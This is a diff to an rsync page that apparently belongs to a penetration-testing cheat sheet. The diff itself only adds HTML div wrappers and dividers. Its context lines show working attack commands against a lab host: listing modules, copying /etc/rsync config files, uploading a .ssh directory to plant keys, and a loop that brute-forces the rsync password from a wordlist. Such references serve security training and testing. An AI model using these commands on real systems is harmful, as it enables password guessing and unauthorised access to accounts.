@@ -7,6 +7,8 @@ tags: ["rsync"]
 ---
 ### Basic Commands
 
+<div>
+
 ```bash
 # List directory ('/')
 rsync --list-only -a rsync://10.10.11.10/
@@ -42,11 +44,21 @@ rsync -a rsync://10.10.11.10/etc/rsync* .
 export RSYNC_PASSWORD=<PASSWORD>; rsync -aR .ssh/ rsync://<USER>@10.10.11.10/home_user/
 ```
 
+</div>
+
+<br>
+
+---
+
 ### Bruteforce rsync password
+
+<div>
 
 ```bash
 # Get user from /etc/passwd, Get module from /etc/rsyncrsyncd.conf (e.g. user user and module home_user)
 cat passwords.txt | while read password; do export RSYNC_PASSWORD=${password}; rsync --list-only rsync://user@10.10.11.10/home_user 2>&1 | grep -q "auth failed on module home_user" || { echo "[+] Found: ${RSYNC_PASSWORD}"; break; } done
 ```
+
+</div>
 
 <br>
